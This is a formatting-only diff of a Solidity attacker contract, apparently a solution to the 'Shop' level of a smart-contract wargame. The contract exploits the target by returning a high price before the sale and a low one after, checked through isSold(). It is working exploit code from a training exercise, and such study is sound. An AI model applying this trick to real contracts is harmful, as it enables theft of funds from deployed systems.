+++ src/21_ShopAttacker.sol
@@ -4,13 +4,14 @@ pragma solidity =0.8.19;
 import {Buyer} from "@main/21_Shop.sol";
 
 interface IShop {
-  function buy() external;
-   function isSold() external view returns(bool);
+    function buy() external;
+    function isSold() external view returns (bool);
 }
 
 contract ShopAttacker is Buyer {
     IShop shop;
     bool firstCalled;
+
     constructor(address _shop) {
         shop = IShop(_shop);
     }
@@ -19,14 +20,13 @@ contract ShopAttacker is Buyer {
         shop.buy();
     }
 
-    function price( ) external view returns (uint) {
+    function price() external view returns (uint256) {
         // fist enter when isSold = false
         if (!shop.isSold()) {
             return 110;
-         // second enter when isSold = true; 
+            // second enter when isSold = true;
         } else {
             return 10;
         }
     }
-
 }
